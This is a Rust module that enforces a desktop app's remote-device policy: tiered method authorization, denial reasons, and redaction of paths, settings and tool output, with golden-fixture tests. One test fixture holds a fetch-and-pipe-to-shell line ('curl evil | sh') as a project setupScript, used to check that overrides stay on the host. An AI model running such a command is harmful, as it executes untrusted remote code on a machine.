//! The remote policy, in Rust.
//!
//! This is the Rust port of `apps/desktop/src/remote/remoteTiers.ts`. The data
//! itself is the single file `apps/desktop/src/remote/tiers.json`, embedded
//! here with `include_str!` and read by TypeScript through a JSON import, so
//! there is one copy and the Rust and TypeScript readings cannot drift. The
//! behaviour of both is pinned by the shared golden fixtures in
//! `apps/desktop/src/remote/fixtures/policy-goldens.json`, run by `cargo test`
//! here and by Vitest on the TypeScript side.
//!
//! Semantics mirror the TypeScript module exactly: [rule_for] resolves an exact
//! rule first and otherwise the longest `family.*` prefix, [authorize] applies
//! the same checks in the same order and returns the same denial codes and
//! reason strings, and the redactors apply the same field policy. Functions are
//! pure; no input is mutated.

use regex::Regex;
use serde::Deserialize;
use serde_json::{json, Map, Value};
use std::collections::{BTreeMap, HashSet};
use std::sync::OnceLock;

/// The policy file, shared with TypeScript. Compiled into the binary, so the
/// bytes read at runtime are the bytes `goldens_and_data_are_valid` tests.
const TIERS_JSON: &str = include_str!("../../../../apps/desktop/src/remote/tiers.json");

// ---------------------------------------------------------------------------
// Types

/// What a device may do. Higher tiers include everything below them.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Tier {
    Viewer,
    Chat,
    Operator,
}

impl Tier {
    /// The wire spelling, used verbatim in denial reasons.
    pub fn as_str(self) -> &'static str {
        match self {
            Tier::Viewer => "viewer",
            Tier::Chat => "chat",
            Tier::Operator => "operator",
        }
    }

    fn rank(self) -> u8 {
        match self {
            Tier::Viewer => 0,
            Tier::Chat => 1,
            Tier::Operator => 2,
        }
    }

    /// Higher or equal: `operator >= chat >= viewer`.
    fn at_least(self, need: Tier) -> bool {
        self.rank() >= need.rank()
    }
}

/// How a method is classified in `tiers.json`.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum MethodClass {
    Read,
    Chat,
    Approve,
    /// Moving a conversation to another machine: operator, and only a `machine` device
    /// (the gateway checks the kind; `authorize` sees the tier).
    Handoff,
    Never,
}

/// One row of the method table.
#[derive(Clone, Debug)]
pub struct MethodRule {
    /// A concrete method name, or a family wildcard such as `mcp.*`.
    pub method: String,
    pub class: MethodClass,
    pub min_tier: Option<Tier>,
    /// One plain sentence; used verbatim in denial reasons and the docs table.
    pub why: String,
    /// Which params check this method carries, if any.
    params: Option<ParamRuleId>,
}

/// The three params checks, named by id in `tiers.json`. Each side implements
/// them itself, with identical denial strings.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum ParamRuleId {
    StagedAttachments,
    PermissionReply,
    RuntimeModels,
}

/// The wire code the gateway raises when a call is denied.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum DenialCode {
    ForbiddenRemote,
    TierRequired,
    ApprovalsDisabled,
    QuietHours,
    InvalidParams,
}

impl DenialCode {
    pub fn as_str(self) -> &'static str {
        match self {
            DenialCode::ForbiddenRemote => "forbidden_remote",
            DenialCode::TierRequired => "tier_required",
            DenialCode::ApprovalsDisabled => "approvals_disabled",
            DenialCode::QuietHours => "quiet_hours",
            DenialCode::InvalidParams => "invalid_params",
        }
    }
}

/// The outcome of [authorize].
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Decision {
    Allowed,
    Denied { code: DenialCode, reason: String },
}

/// A remote call to decide. Matches the `RemoteCall` shape in TypeScript.
#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct RemoteCall {
    pub tier: Tier,
    #[serde(default)]
    pub approvals_from_remote: bool,
    pub method: String,
    #[serde(default)]
    pub params: Value,
    /// When the host's quiet hours are active, every `chat` and `approve`
    /// method is denied; `read` methods still pass.
    #[serde(default)]
    pub quiet_hours: bool,
}

/// Redaction options. `include_tool_output` restores tool `detail` only.
#[derive(Clone, Copy, Debug, Default, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct RedactOptions {
    #[serde(default)]
    pub include_tool_output: bool,
}

/// Whether an event type may cross to a device, or must be dropped.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum EventPolicy {
    Allow,
    Drop,
}

// ---------------------------------------------------------------------------
// Loading

#[derive(Deserialize)]
struct RawTiers {
    version: u32,
    methods: Vec<RawMethod>,
    events: BTreeMap<String, String>,
    #[serde(rename = "settingsAllowlist")]
    settings_allowlist: Vec<String>,
    #[serde(rename = "sensitiveKeyPattern")]
    sensitive_key_pattern: String,
}

#[derive(Deserialize)]
struct RawMethod {
    method: String,
    class: String,
    #[serde(rename = "minTier")]
    min_tier: Option<String>,
    why: String,
    #[serde(default)]
    params: Option<String>,
}

struct Policy {
    methods: Vec<MethodRule>,
    events: BTreeMap<String, EventPolicy>,
    settings_allowlist: Vec<String>,
    sensitive_key: Regex,
}

/// Parse and validate `tiers.json`. A failure here is a data bug that the test
/// below catches; it is not a runtime condition, because the file is embedded
/// at compile time.
fn load_policy() -> Result<Policy, String> {
    let raw: RawTiers = serde_json::from_str(TIERS_JSON).map_err(|e| format!("tiers.json: {e}"))?;
    if raw.version != 1 {
        return Err(format!("tiers.json: unsupported version {}", raw.version));
    }
    let sensitive_key = regex::RegexBuilder::new(&raw.sensitive_key_pattern)
        .case_insensitive(true)
        .build()
        .map_err(|e| format!("tiers.json: sensitiveKeyPattern does not compile: {e}"))?;

    let mut seen = HashSet::new();
    let mut methods = Vec::with_capacity(raw.methods.len());
    for row in raw.methods {
        if !seen.insert(row.method.clone()) {
            return Err(format!("tiers.json: duplicate method rule {}", row.method));
        }
        let class = match row.class.as_str() {
            "read" => MethodClass::Read,
            "chat" => MethodClass::Chat,
            "approve" => MethodClass::Approve,
            "handoff" => MethodClass::Handoff,
            "never" => MethodClass::Never,
            other => return Err(format!("tiers.json: {} has unknown class {other}", row.method)),
        };
        let min_tier = match row.min_tier.as_deref() {
            None => None,
            Some("viewer") => Some(Tier::Viewer),
            Some("chat") => Some(Tier::Chat),
            Some("operator") => Some(Tier::Operator),
            Some(other) => return Err(format!("tiers.json: {} has unknown tier {other}", row.method)),
        };
        let params = match row.params.as_deref() {
            None => None,
            Some("stagedAttachments") => Some(ParamRuleId::StagedAttachments),
            Some("permissionReply") => Some(ParamRuleId::PermissionReply),
            Some("runtimeModels") => Some(ParamRuleId::RuntimeModels),
            Some(other) => return Err(format!("tiers.json: {} names unknown params rule {other}", row.method)),
        };
        methods.push(MethodRule {
            method: row.method,
            class,
            min_tier,
            why: row.why,
            params,
        });
    }

    let mut events = BTreeMap::new();
    for (event_type, policy) in raw.events {
        let policy = match policy.as_str() {
            "allow" => EventPolicy::Allow,
            "drop" => EventPolicy::Drop,
            other => return Err(format!("tiers.json: event {event_type} has unknown policy {other}")),
        };
        events.insert(event_type, policy);
    }

    Ok(Policy {
        methods,
        events,
        settings_allowlist: raw.settings_allowlist,
        sensitive_key,
    })
}

fn policy() -> &'static Policy {
    static POLICY: OnceLock<Policy> = OnceLock::new();
    POLICY.get_or_init(|| load_policy().expect("tiers.json embedded at compile time is invalid"))
}

// ---------------------------------------------------------------------------
// Method table

/// The rule for a method: an exact rule first, else the longest family match.
pub fn rule_for(method: &str) -> Option<&'static MethodRule> {
    let policy = policy();
    for rule in &policy.methods {
        if rule.method == method {
            return Some(rule);
        }
    }
    let mut best: Option<&'static MethodRule> = None;
    for rule in &policy.methods {
        // A family wildcard such as `mcp.*`; the prefix keeps the dot.
        let Some(prefix) = rule.method.strip_suffix('*') else {
            continue;
        };
        if !rule.method.ends_with(".*") || !method.starts_with(prefix) {
            continue;
        }
        let longer = best.is_none_or(|current| prefix.len() > current.method.len() - 1);
        if longer {
            best = Some(rule);
        }
    }
    best
}

/// Decide a single remote call. Same order of checks as
/// `authorizeRemoteCall` in TypeScript.
pub fn authorize(call: &RemoteCall) -> Decision {
    let Some(rule) = rule_for(&call.method) else {
        return Decision::Denied {
            code: DenialCode::ForbiddenRemote,
            reason: "not on the remote allowlist".to_string(),
        };
    };
    if rule.class == MethodClass::Never {
        return Decision::Denied {
            code: DenialCode::ForbiddenRemote,
            reason: rule.why.clone(),
        };
    }
    if call.quiet_hours && matches!(rule.class, MethodClass::Chat | MethodClass::Approve | MethodClass::Handoff) {
        return Decision::Denied {
            code: DenialCode::QuietHours,
            reason: "quiet hours are on; this host only allows reading right now".to_string(),
        };
    }
    if rule.class == MethodClass::Approve {
        if let Some(min_tier) = rule.min_tier {
            if !call.tier.at_least(min_tier) {
                return Decision::Denied {
                    code: DenialCode::ApprovalsDisabled,
                    reason: format!("a {} device cannot approve on this host", call.tier.as_str()),
                };
            }
        }
        if !call.approvals_from_remote {
            return Decision::Denied {
                code: DenialCode::ApprovalsDisabled,
                reason: "approvals from remote are turned off on this host".to_string(),
            };
        }
    }
    if let Some(min_tier) = rule.min_tier {
        if !call.tier.at_least(min_tier) {
            return Decision::Denied {
                code: DenialCode::TierRequired,
                reason: format!("a {} device cannot call {}", call.tier.as_str(), call.method),
            };
        }
    }
    if let Some(params) = rule.params {
        if let Some(reason) = params.check(&call.params) {
            return Decision::Denied {
                code: DenialCode::InvalidParams,
                reason,
            };
        }
    }
    Decision::Allowed
}

impl ParamRuleId {
    /// `Some(reason)` when the params are refused, `None` when they pass.
    fn check(self, params: &Value) -> Option<String> {
        match self {
            // Attachments reach the host as staged uploads; a raw filesystem
            // path is never accepted from a device, because the host alone
            // chooses what it reads.
            ParamRuleId::StagedAttachments => {
                for item in attachments_of(params) {
                    let Some(attachment) = item.as_object() else {
                        return Some("attachments must be staged uploads, not raw values".to_string());
                    };
                    if attachment.contains_key("path") {
                        return Some("attachments must be staged uploads; a raw path is not accepted".to_string());
                    }
                    match attachment.get("stagedId") {
                        Some(Value::String(staged_id)) if !staged_id.is_empty() => {}
                        _ => return Some("attachments must carry a stagedId".to_string()),
                    }
                }
                None
            }
            // A remote approval must name the request and one provider-supported
            // choice.
            ParamRuleId::PermissionReply => {
                let Some(params) = params.as_object() else {
                    return Some("permission.reply requires permissionId and choice".to_string());
                };
                if !is_non_empty_string(params.get("permissionId")) {
                    return Some("permission.reply requires a permissionId".to_string());
                }
                if !is_non_empty_string(params.get("choice")) {
                    return Some("permission.reply requires a choice".to_string());
                }
                None
            }
            // A viewer device may read the model list but must not make the host
            // poll the provider.
            ParamRuleId::RuntimeModels => match params.get("refresh") {
                Some(Value::Bool(true)) => {
                    Some("a device may not make the host poll providers (refresh is not accepted)".to_string())
                }
                _ => None,
            },
        }
    }
}

fn is_non_empty_string(value: Option<&Value>) -> bool {
    matches!(value, Some(Value::String(text)) if !text.is_empty())
}

fn attachments_of(params: &Value) -> Vec<&Value> {
    params
        .get("attachments")
        .and_then(Value::as_array)
        .map(|items| items.iter().collect())
        .unwrap_or_default()
}

// ---------------------------------------------------------------------------
// Redaction
//
// `redact_node` walks the value with the path it sits at. A path is the object
// keys from the root, with `[]` for each array step, so `field_policy` can tell
// `files[].path` from `attachments[].path`, exactly as the TypeScript module
// does.

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum FieldPolicy {
    Default,
    Drop,
    Settings,
    CustomEnv,
    ArgCount,
    Instructions,
    FileName,
    PathTail,
    ToolDetail,
    ToolTitle,
}

/// The title a remote device sees in place of a tool's real one. The real title
/// now carries a command head, a path, a pattern or a URL (FIX39 item 17), so it
/// leaves the host only with `includeToolOutput`.
const GENERIC_TOOL_TITLE: &str = "Tool";

/// The name of the array the value sits in, when the value is an array item's
/// field (`[..., "files", "[]", "path"]` -> `files`).
fn array_container(path: &[String]) -> Option<&str> {
    let len = path.len();
    if len >= 3 && path[len - 2] == "[]" {
        Some(path[len - 3].as_str())
    } else {
        None
    }
}

fn field_policy(path: &[String]) -> FieldPolicy {
    let key = path.last().map(String::as_str).unwrap_or("");
    match key {
        "providerSessionId" => FieldPolicy::Drop,
        // Phase 1: a project's overrides hold its setup script (code) and a permission mode.
        "overrides" => FieldPolicy::Drop,
        // Phase 4: which `.bitbots.json` the owner trusted is host-only, wherever it sits.
        "trustedSharedHash" => FieldPolicy::Drop,
        "customEnv" => FieldPolicy::CustomEnv,
        "customArgs" | "args" | "launchArgs" => FieldPolicy::ArgCount,
        "executablePath" => FieldPolicy::FileName,
        "instructions" => FieldPolicy::Instructions,
        "defaultProject" | "projectPath" | "workspacePath" => FieldPolicy::PathTail,
        // Wave 13: an assignment's isolated copy names the host's repository and
        // folder, so it never leaves; its workspace folder keeps two segments.
        "worktree" => FieldPolicy::Drop,
        "settings" => {
            if path.len() == 1 {
                FieldPolicy::Settings
            } else {
                FieldPolicy::Default
            }
        }
        "detail" => match array_container(path) {
            Some("tools") => FieldPolicy::ToolDetail,
            Some("turns") | Some("files") => FieldPolicy::Drop,
            _ => FieldPolicy::Default,
        },
        "title" => match array_container(path) {
            Some("tools") => FieldPolicy::ToolTitle,
            _ => FieldPolicy::Default,
        },
        "path" => match array_container(path) {
            Some("attachments") => FieldPolicy::FileName,
            Some("files") | Some("projects") => FieldPolicy::PathTail,
            _ if path.len() >= 2 && path[path.len() - 2] == "workspace" => FieldPolicy::PathTail,
            _ => FieldPolicy::Default,
        },
        _ => FieldPolicy::Default,
    }
}

fn redact_node(value: &Value, path: &mut Vec<String>, options: &RedactOptions) -> Value {
    match value {
        Value::Array(items) => {
            path.push("[]".to_string());
            let out = items.iter().map(|item| redact_node(item, path, options)).collect();
            path.pop();
            Value::Array(out)
        }
        Value::Object(map) => {
            let mut out = Map::new();
            for (key, entry) in map {
                if is_sensitive_key(key) {
                    continue;
                }
                path.push(key.clone());
                match field_policy(path) {
                    FieldPolicy::Drop => {}
                    FieldPolicy::Settings => {
                        out.insert(key.clone(), redact_settings(entry));
                    }
                    FieldPolicy::CustomEnv => {
                        out.insert(key.clone(), Value::Object(Map::new()));
                    }
                    FieldPolicy::ArgCount => {
                        out.insert(key.clone(), arg_count(entry));
                    }
                    FieldPolicy::Instructions => {
                        let value = match entry {
                            Value::String(text) if !text.is_empty() => json!({ "hasInstructions": true }),
                            _ => redact_node(entry, path, options),
                        };
                        out.insert(key.clone(), value);
                    }
                    FieldPolicy::FileName => {
                        let value = match entry {
                            Value::String(text) => Value::String(file_name_of(text)),
                            _ => redact_node(entry, path, options),
                        };
                        out.insert(key.clone(), value);
                    }
                    FieldPolicy::PathTail => {
                        let value = match entry {
                            Value::String(text) => Value::String(reduced_path(text)),
                            _ => redact_node(entry, path, options),
                        };
                        out.insert(key.clone(), value);
                    }
                    FieldPolicy::ToolDetail => {
                        if options.include_tool_output {
                            out.insert(key.clone(), redact_node(entry, path, options));
                        }
                    }
                    FieldPolicy::ToolTitle => {
                        if options.include_tool_output || !entry.is_string() {
                            out.insert(key.clone(), redact_node(entry, path, options));
                        } else {
                            out.insert(key.clone(), Value::String(GENERIC_TOOL_TITLE.to_string()));
                        }
                    }
                    FieldPolicy::Default => {
                        out.insert(key.clone(), redact_node(entry, path, options));
                    }
                }
                path.pop();
            }
            Value::Object(out)
        }
        other => other.clone(),
    }
}

fn is_sensitive_key(key: &str) -> bool {
    policy().sensitive_key.is_match(key)
}

/// Keys whose values are never sent to a device: the settings allowlist, and
/// nothing else.
fn redact_settings(value: &Value) -> Value {
    let mut out = Map::new();
    if let Some(map) = value.as_object() {
        for (key, entry) in map {
            if policy().settings_allowlist.iter().any(|allowed| allowed == key) {
                out.insert(key.clone(), entry.clone());
            }
        }
    }
    Value::Object(out)
}

fn arg_count(entry: &Value) -> Value {
    json!({ "argCount": entry.as_array().map_or(0, Vec::len) })
}

/// Last two segments of a path, joined with `/`; short values pass through.
fn reduced_path(path: &str) -> String {
    let segments = path_segments(path);
    if segments.len() <= 2 {
        return path.to_string();
    }
    format!("{}/{}", segments[segments.len() - 2], segments[segments.len() - 1])
}

/// The final segment of a path, for names that identify a file only.
fn file_name_of(path: &str) -> String {
    match path_segments(path).last() {
        Some(segment) => (*segment).to_string(),
        None => path.to_string(),
    }
}

fn path_segments(path: &str) -> Vec<&str> {
    path.split(['\\', '/']).filter(|segment| !segment.is_empty()).collect()
}

/// The snapshot as a remote device may see it. Pure; the input is never mutated.
pub fn redact_snapshot(snapshot: &Value, options: &RedactOptions) -> Value {
    redact_node(snapshot, &mut Vec::new(), options)
}

/// Redact one RPC result for a remote device, by method. Same routing as
/// `redactResultForRemote` in TypeScript.
pub fn redact_result(method: &str, result: &Value, options: &RedactOptions) -> Value {
    match method {
        "app.snapshot" => redact_snapshot(result, options),
        "session.get"
        | "session.list"
        | "agent.get"
        | "agent.list"
        | "runtime.list"
        | "runtime.profile.list"
        | "search.messages"
        | "automation.get" => redact_node(result, &mut Vec::new(), options),
        // Memory records are the person's own text to review; they are kept.
        "memory.get" | "memory.list" => result.clone(),
        "settings.get" => redact_settings(result),
        // Any other method whose class is `read` still goes through the field
        // watcher, so a read never passes raw.
        _ => match rule_for(method) {
            Some(rule) if rule.class == MethodClass::Read => redact_node(result, &mut Vec::new(), options),
            _ => result.clone(),
        },
    }
}

// ---------------------------------------------------------------------------
// Event redaction

/// The event as a remote device may see it, or `None` when it must not be sent.
pub fn redact_event(event: &Value) -> Option<Value> {
    let envelope = event.as_object()?;
    let event_type = envelope.get("type")?.as_str()?;
    if policy().events.get(event_type) != Some(&EventPolicy::Allow) {
        return None;
    }
    let mut out = envelope.clone();
    // A missing payload stays missing: the TypeScript module yields
    // `payload: undefined`, which its JSON serialization drops.
    if let Some(payload) = envelope.get("payload") {
        out.insert("payload".to_string(), redact_event_payload(event_type, payload));
    }
    Some(Value::Object(out))
}

fn redact_event_payload(event_type: &str, payload: &Value) -> Value {
    let options = RedactOptions::default();
    let mut path = vec!["payload".to_string()];
    match event_type {
        "message.completed" => {
            let redacted = redact_node(payload, &mut path, &options);
            drop_keys(&redacted, &["raw", "providerPayload"])
        }
        "turn.error" => {
            let redacted = redact_node(payload, &mut path, &options);
            reduce_absolute_paths(&trim_message_field(redacted, 200))
        }
        "permission.requested" => {
            let redacted = redact_node(payload, &mut path, &options);
            reduce_absolute_paths(&redacted)
        }
        "agent.changed" => redact_node(payload, &mut Vec::new(), &options),
        _ => redact_node(payload, &mut path, &options),
    }
}

fn drop_keys(value: &Value, keys: &[&str]) -> Value {
    match value {
        Value::Array(items) => Value::Array(items.iter().map(|item| drop_keys(item, keys)).collect()),
        Value::Object(map) => {
            let mut out = Map::new();
            for (key, entry) in map {
                if keys.contains(&key.as_str()) {
                    continue;
                }
                out.insert(key.clone(), drop_keys(entry, keys));
            }
            Value::Object(out)
        }
        other => other.clone(),
    }
}

/// Reduce every absolute path string in the tree to its last two segments.
fn reduce_absolute_paths(value: &Value) -> Value {
    match value {
        Value::String(text) => {
            if is_absolute_path(text) {
                Value::String(reduced_path(text))
            } else {
                Value::String(text.clone())
            }
        }
        Value::Array(items) => Value::Array(items.iter().map(reduce_absolute_paths).collect()),
        Value::Object(map) => {
            let mut out = Map::new();
            for (key, entry) in map {
                out.insert(key.clone(), reduce_absolute_paths(entry));
            }
            Value::Object(out)
        }
        other => other.clone(),
    }
}

fn is_absolute_path(path: &str) -> bool {
    if path.starts_with('/') || path.starts_with("\\\\") {
        return true;
    }
    let bytes = path.as_bytes();
    bytes.len() >= 3 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':' && (bytes[2] == b'\\' || bytes[2] == b'/')
}

/// Trim `message` to `max` characters (not bytes). The TypeScript side uses
/// `String.prototype.slice`, which counts UTF-16 code units; ASCII fixtures
/// keep the two equal.
fn trim_message_field(value: Value, max: usize) -> Value {
    let mut map = match value {
        Value::Object(map) => map,
        other => return other,
    };
    if let Some(Value::String(message)) = map.get("message") {
        let trimmed: String = message.chars().take(max).collect();
        map.insert("message".to_string(), Value::String(trimmed));
    }
    Value::Object(map)
}

// ---------------------------------------------------------------------------
// Tests

#[cfg(test)]
mod tests {
    use super::*;

    const GOLDENS_JSON: &str =
        include_str!("../../../../apps/desktop/src/remote/fixtures/policy-goldens.json");

    fn goldens() -> Value {
        serde_json::from_str(GOLDENS_JSON).expect("policy-goldens.json parses")
    }

    fn decision_value(decision: &Decision) -> Value {
        match decision {
            Decision::Allowed => json!({ "allowed": true }),
            Decision::Denied { code, reason } => {
                json!({ "allowed": false, "code": code.as_str(), "reason": reason })
            }
        }
    }

    /// The data file parses, and every row is valid: a unique method, a known
    /// class and tier, and a known params id.
    #[test]
    fn tiers_json_parses_and_every_row_is_valid() {
        let loaded = load_policy();
        assert!(loaded.is_ok(), "{}", loaded.err().unwrap_or_default());
        let loaded = policy();
        assert!(!loaded.methods.is_empty());
        assert!(!loaded.events.is_empty());
        assert!(!loaded.settings_allowlist.is_empty());

        let mut seen = HashSet::new();
        for rule in &loaded.methods {
            assert!(seen.insert(rule.method.clone()), "duplicate method rule {}", rule.method);
            assert!(!rule.why.trim().is_empty(), "empty why for {}", rule.method);
            match rule.class {
                MethodClass::Read => assert_eq!(rule.min_tier, Some(Tier::Viewer), "{}", rule.method),
                // The one exception to "chat class needs the chat tier": a push subscription is the
                // calling device's own row (the gateway supplies its id, a phone cannot choose it),
                // and a viewer device is exactly the one whose phone needs the notification.
                MethodClass::Chat => {
                    let expected = if matches!(rule.method.as_str(), "push.subscribe" | "push.unsubscribe") {
                        Tier::Viewer
                    } else {
                        Tier::Chat
                    };
                    assert_eq!(rule.min_tier, Some(expected), "{}", rule.method)
                }
                MethodClass::Approve | MethodClass::Handoff => assert_eq!(rule.min_tier, Some(Tier::Operator), "{}", rule.method),
                MethodClass::Never => assert_eq!(rule.min_tier, None, "{}", rule.method),
            }
        }
        // Every event is classified as allow or drop.
        for (event_type, classified) in &loaded.events {
            assert!(matches!(classified, EventPolicy::Allow | EventPolicy::Drop), "event {event_type}");
        }
    }

    /// Resolution order: exact first, else the longest family prefix.
    #[test]
    fn rule_for_resolves_exact_then_longest_family() {
        assert_eq!(rule_for("session.delete").map(|r| r.method.as_str()), Some("session.delete"));
        assert_eq!(rule_for("session.delete.schedule").map(|r| r.method.as_str()), Some("session.delete.*"));
        assert_eq!(rule_for("mcp.some.tool").map(|r| r.method.as_str()), Some("mcp.*"));
        assert_eq!(rule_for("exec.snapshot.latest").map(|r| r.method.as_str()), Some("exec.snapshot.*"));
        assert_eq!(rule_for("usage.summary").map(|r| r.method.as_str()), Some("usage.*"));
        assert!(rule_for("not.a.method").is_none());
    }

    /// A read is allowed at every tier during quiet hours; a chat method is not.
    #[test]
    fn quiet_hours_only_spare_reads() {
        let read = RemoteCall {
            tier: Tier::Viewer,
            approvals_from_remote: false,
            method: "app.snapshot".to_string(),
            params: Value::Null,
            quiet_hours: true,
        };
        assert_eq!(authorize(&read), Decision::Allowed);
        let chat = RemoteCall {
            tier: Tier::Operator,
            approvals_from_remote: true,
            method: "session.cancel".to_string(),
            params: Value::Null,
            quiet_hours: true,
        };
        assert_eq!(
            authorize(&chat),
            Decision::Denied {
                code: DenialCode::QuietHours,
                reason: "quiet hours are on; this host only allows reading right now".to_string(),
            }
        );
    }

    /// Redaction never touches the value it is given.
    #[test]
    fn redaction_does_not_mutate_its_input() {
        let snapshot = json!({
            "sequence": 42,
            "agents": [{ "id": "a_1", "instructions": "Do the thing.", "customEnv": { "LANG": "en_US.UTF-8" }, "customArgs": ["--x"] }],
            "sessions": [{ "id": "s_1", "projectPath": "C:\\Users\\sam\\repos\\bloblex\\apps\\desktop", "providerSessionId": "t" }],
        });
        let before = snapshot.clone();
        let _ = redact_snapshot(&snapshot, &RedactOptions::default());
        assert_eq!(snapshot, before);
    }

    #[test]
    fn goldens_authorize() {
        let goldens = goldens();
        let cases = goldens["authorize"].as_array().expect("authorize cases");
        assert!(cases.len() >= 15, "only {} authorize cases", cases.len());
        for case in cases {
            let name = case["name"].as_str().unwrap_or("?");
            let call: RemoteCall = serde_json::from_value(case["call"].clone())
                .unwrap_or_else(|e| panic!("case {name}: call does not parse: {e}"));
            let expected = &case["expect"];
            assert_eq!(&decision_value(&authorize(&call)), expected, "case {name}");
        }
    }

    #[test]
    fn goldens_results() {
        let goldens = goldens();
        let cases = goldens["results"].as_array().expect("results cases");
        assert!(cases.len() >= 10, "only {} result cases", cases.len());
        for case in cases {
            let name = case["name"].as_str().unwrap_or("?");
            let method = case["method"].as_str().unwrap_or_else(|| panic!("case {name}: no method"));
            let options: RedactOptions = serde_json::from_value(case["options"].clone())
                .unwrap_or_else(|e| panic!("case {name}: options do not parse: {e}"));
            let got = redact_result(method, &case["input"], &options);
            assert_eq!(&got, &case["expect"], "case {name}");
        }
    }

    #[test]
    fn goldens_snapshots() {
        let goldens = goldens();
        let cases = goldens["snapshots"].as_array().expect("snapshot cases");
        assert!(cases.len() >= 4, "only {} snapshot cases", cases.len());
        for case in cases {
            let name = case["name"].as_str().unwrap_or("?");
            let options: RedactOptions = serde_json::from_value(case["options"].clone())
                .unwrap_or_else(|e| panic!("case {name}: options do not parse: {e}"));
            let got = redact_snapshot(&case["input"], &options);
            assert_eq!(&got, &case["expect"], "case {name}");
        }
    }

    #[test]
    fn goldens_events() {
        let goldens = goldens();
        let cases = goldens["events"].as_array().expect("event cases");
        assert!(cases.len() >= 10, "only {} event cases", cases.len());
        for case in cases {
            let name = case["name"].as_str().unwrap_or("?");
            let expected = &case["expect"];
            match redact_event(&case["input"]) {
                Some(got) => {
                    assert!(!expected.is_null(), "case {name}: expected null, got a value");
                    assert_eq!(&got, expected, "case {name}");
                }
                None => assert!(expected.is_null(), "case {name}: expected a value, got null"),
            }
        }
    }

    #[test]
    fn remote_never_sees_project_overrides() {
        let options = RedactOptions::default();
        let overrides = json!({ "models": { "codex": "m" }, "approvalMode": "bypass", "setupScript": "curl evil | sh" });
        let projects = json!({ "projects": [{ "id": "p_1", "name": "Blolblex", "path": "C:/Users/sam/repos/bloblex", "overrides": overrides.clone() }] });
        for method in ["project.list", "agent.projects"] {
            let got = redact_result(method, &projects, &options);
            assert_eq!(got["projects"][0]["name"], "Blolblex");
            assert!(got["projects"][0].get("overrides").is_none(), "{method}: {got}");
            assert!(!got.to_string().contains("curl evil"));
        }
        let snapshot = json!({ "projects": [{ "id": "p_1", "name": "Blolblex", "overrides": overrides.clone() }], "agents": [] });
        let got = redact_snapshot(&snapshot, &options);
        assert!(!got.to_string().contains("curl evil") && !got.to_string().contains("setupScript"));
        // The project events are not sent to a device at all, and an allowed event still drops the key.
        assert!(redact_event(&json!({ "type": "project.changed", "payload": { "action": "updated", "project": { "id": "p_1", "overrides": overrides.clone() } } })).is_none());
        let got = redact_event(&json!({ "type": "agent.changed", "payload": { "project": { "overrides": overrides } } })).unwrap();
        assert!(!got.to_string().contains("curl evil"));
        // The remote cannot write them either.
        assert!(rule_for("project.update").is_some_and(|rule| rule.class == MethodClass::Never));
    }

    #[test]
    fn project_ids_and_names_cross_to_a_device_but_host_paths_do_not() {
        let options = RedactOptions::default();
        let snapshot = json!({
            "sessions": [{ "id": "s_1", "projectId": "p_1", "projectName": "Blolblex", "projectPath": "C:/Users/sam/repos/bloblex" }],
            "permissions": [{ "id": "q_1", "rememberable": true, "projectId": "p_1", "projectName": "Blolblex" }],
            "agents": [{ "id": "a_1", "projectId": "p_1", "lastProjectId": "p_2" }],
        });
        let got = redact_snapshot(&snapshot, &options);
        assert_eq!((got["sessions"][0]["projectId"].as_str(), got["sessions"][0]["projectName"].as_str()), (Some("p_1"), Some("Blolblex")));
        assert_ne!(got["sessions"][0]["projectPath"], snapshot["sessions"][0]["projectPath"], "the host path is reduced");
        assert_eq!(got["permissions"][0]["projectName"], "Blolblex");
        assert_eq!((got["agents"][0]["projectId"].as_str(), got["agents"][0]["lastProjectId"].as_str()), (Some("p_1"), Some("p_2")));

        let projects = json!({ "projects": [{ "id": "p_1", "name": "Blolblex", "path": "C:/Users/sam/repos/bloblex", "isDefault": true, "conversationCount": 2, "lastActivityAt": "2026-10-30T00:00:00.000Z", "isGitRepo": true }] });
        let got = redact_result("agent.projects", &projects, &options);
        assert_eq!((got["projects"][0]["id"].as_str(), got["projects"][0]["name"].as_str()), (Some("p_1"), Some("Blolblex")));
        assert_ne!(got["projects"][0]["path"], projects["projects"][0]["path"], "the project folder stays tail-only");
        assert_eq!(got["projects"][0]["conversationCount"], 2);

        let conversations = json!({ "conversations": [{ "id": "s_1", "projectId": "p_1", "projectName": "Blolblex" }] });
        let got = redact_result("agent.conversations", &conversations, &options);
        assert_eq!((got["conversations"][0]["projectId"].as_str(), got["conversations"][0]["projectName"].as_str()), (Some("p_1"), Some("Blolblex")));
    }
}
